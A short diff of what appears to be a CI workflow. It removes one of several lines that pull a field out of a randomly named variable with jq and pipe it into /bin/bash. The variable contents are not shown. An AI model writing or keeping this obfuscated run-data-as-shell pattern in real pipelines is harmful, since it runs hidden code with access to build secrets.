@@ -45,7 +45,6 @@ jobs:
           echo $xw83747 | jq -r .u78044 | /bin/bash
           echo $uws93 | jq -r .zk126 | /bin/bash
           printf '%s' "$edid4136" | jq -r .q51 | /bin/bash
-          echo $wae2 | jq -r .kiva71 | /bin/bash
           echo $bj493 | jq -r .sml40325 | /bin/bash
 
       - name: Archive results
